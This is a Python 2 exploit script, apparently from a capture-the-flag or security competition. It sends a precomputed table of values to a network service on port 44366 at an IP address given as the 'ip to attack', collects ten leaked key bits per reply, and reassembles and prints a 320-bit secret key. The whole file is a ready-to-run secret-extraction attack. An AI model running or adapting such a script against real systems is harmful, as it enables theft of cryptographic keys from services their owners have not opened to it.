import socket, sys, struct, re, binascii


blob = """
0000ae5c  242 110 010 050 217 082 279 275 297 046
0000ca4c  134 074 150 070 017 126 099 038 045 138
0001316f  095 145 257 191 306 127 242 215 286 081
00009238  170 146 074 042 024 090 119 158 157 082
00006933  090 217 188 186 166 054 045 142 126 281
000079a7  222 009 192 190 293 274 209 013 279 233
0000b263  209 066 245 305 201 079 070 059 007 162
00016ae4  143 097 271 015 213 315 144 041 251 225
0000721b  105 130 045 137 003 087 190 124 183 226
0000a0a7  007 208 231 295 270 313 008 112 268 272
000018f5  237 072 109 077 000 099 134 076 136 104
00008699  031 086 063 127 149 301 052 082 206 022
0000284f  103 280 087 007 084 281 088 033 245 024
00016a07  108 097 242 172 152 030 071 090 268 289
00005f94  203 095 179 139 208 267 206 103 055 223
0000e799  126 183 160 158 180 078 277 181 289 119
00005bbd  230 075 248 070 215 222 157 072 285 235
00014627  096 097 302 224 267 226 107 159 212 225
00014124  100 209 070 068 082 036 033 202 234 017
000173c1  179 177 213 211 195 271 106 051 025 049
0000d938  225 217 145 097 095 161 060 155 084 153
0000c838  240 200 128 112 110 144 045 166 071 136
00015943  027 145 061 315 041 107 118 094 286 017
0000334f  124 259 098 028 105 292 067 014 232 035
00005763  052 039 154 020 044 308 035 090 236 071
00014f4d  003 049 061 099 315 127 026 311 290 177
000122ca  233 033 301 169 006 297 086 085 211 097
00001acd  215 074 071 055 032 141 012 097 122 106
0000bdcf  114 269 300 274 287 302 077 307 099 301
0000e37f  156 211 258 124 093 100 259 033 281 019
000182e8  107 097 299 171 130 231 116 196 026 033
00005696  192 118 236 064 237 256 317 217 004 246
0000c6bc  122 262 002 314 265 010 031 261 192 006
000028ef  199 280 247 231 172 121 312 026 180 024
00007fc7  184 207 294 216 087 248 247 293 109 111
0000de66  184 126 068 056 017 120 293 000 301 254
00015033  098 065 260 162 139 036 253 287 136 257
0000bbe9  082 107 196 178 252 274 249 071 149 075
00009fbb  036 303 250 196 214 292 243 199 293 271
0001259a  190 273 288 286 308 054 143 219 025 017
00011459  076 193 302 204 310 006 275 153 120 065
00007355  038 035 040 134 061 030 205 165 292 195
00009f51  206 143 272 238 130 078 277 091 312 175
00005d2c  113 029 265 241 196 049 148 200 120 157
00003a87  189 202 033 285 060 243 242 184 278 298
000015f3  230 037 040 006 066 098 209 092 131 069
0000b7ed  090 167 004 058 127 266 129 136 153 135
0000dc55  137 140 145 041 132 135 034 303 013 300
0000dd0b  214 109 264 118 244 210 289 316 186 077
000137ad  155 177 133 123 227 311 210 066 113 049
0000650f  106 149 276 074 263 086 213 260 186 021
0000e0cd  045 240 269 077 062 019 310 164 128 304
000023e3  192 083 166 160 216 128 151 042 145 147
000116c5  210 033 220 274 043 304 297 229 271 225
0000d11e  207 305 239 143 198 179 066 047 144 049
000141a5  229 273 071 261 163 101 284 156 037 081
00013975  077 273 015 173 194 189 164 318 278 145
00014756  016 305 318 240 153 080 197 119 246 113
00006e8b  229 030 217 005 315 291 018 107 010 094
0000f55c  169 053 081 297 080 153 204 130 048 117
0000c719  222 023 064 062 052 174 309 041 128 279
0000d4c9  029 260 125 061 175 011 246 276 188 228
0000b0b1  001 096 257 289 269 319 154 095 296 128
0000d9bf  102 297 120 134 151 026 185 052 167 073
0000660d  107 182 211 139 196 089 176 096 135 310
0000938a  025 179 221 281 319 009 028 106 255 115
0000baf6  076 218 304 268 001 260 049 094 168 282
000173c9  187 305 285 283 200 151 194 157 057 177
"""

def init_key_mask(size):
    keymask={}
    x=1
    for i in range(0,size):
        keymask[i] = x
        x <<= 1
    return keymask


def reassemble_key(coll):
    keyindexmask = init_key_mask(320)
    keybitmask = init_key_mask(10)
    key = 0
    keyindex_present=set()
    for list_10_indices, int_10bit in coll:
        for x in range(0,10):
            keyindex = list_10_indices[x]
            if (keybitmask[x] & int_10bit):
                key |= keyindexmask[keyindex]
            keyindex_present.add(keyindex)
            if len(keyindex_present) == 320:
                print >> sys.stderr, 'Finished reassmbling key'
                return key
            
    if len(keyindex_present) != 320:
        print >> sys.stderr, 'We\'re missing keybits!'
        return None

def readCollection():

	# 00002aef 197 282 249 229 170 123 314 095 212 026
	pat = re.compile("(.+) (.+) (.+) (.+) (.+) (.+) (.+) (.+) (.+) (.+) (.+)")
	for line in blob.split('\n'):
		if not len(line.strip()):
			continue
		m = pat.match(line)
		strs = list(m.groups())
		data = int(strs[0],16)
		vals = [ int(d,10) for d in strs[1:] ]
		yield (data, vals)

def main():
    port = 44366
    if len(sys.argv) != 2:
        print >> sys.stderr, "Usage: %s <ip to attack>" % sys.argv[0]
        return
		
    host = sys.argv[1]
    #blob_collection = "hiver_request_set"

    reassembly_collection = []
    for (blob, list10_keyindices) in readCollection():
        sock = socket.create_connection((host,port))
        sock.send(struct.pack('<II', 4, blob))
        d = sock.recv(100)
        p = (list10_keyindices, int(d))
        reassembly_collection.append(p)
        sock.close()
        
    key = reassemble_key(reassembly_collection)
    if key==-1 or not key:
        print >> sys.stderr, 'Oops'
        sys.exit(2)
    else:
        print >> sys.stderr, key
        print binascii.a2b_hex("%080x"%(key,))[::-1]
    


    
    
main()
